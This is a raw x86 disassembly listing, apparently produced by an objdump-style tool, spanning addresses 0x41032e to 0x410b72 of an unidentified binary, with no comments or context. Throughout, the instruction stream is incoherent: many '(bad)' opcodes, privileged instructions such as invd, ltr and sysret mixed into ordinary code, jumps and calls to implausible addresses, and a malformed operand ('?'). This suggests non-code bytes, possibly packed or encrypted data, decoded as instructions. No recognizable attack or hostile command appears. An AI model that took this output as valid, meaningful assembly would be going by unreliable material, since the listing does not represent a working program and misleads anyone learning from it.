  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
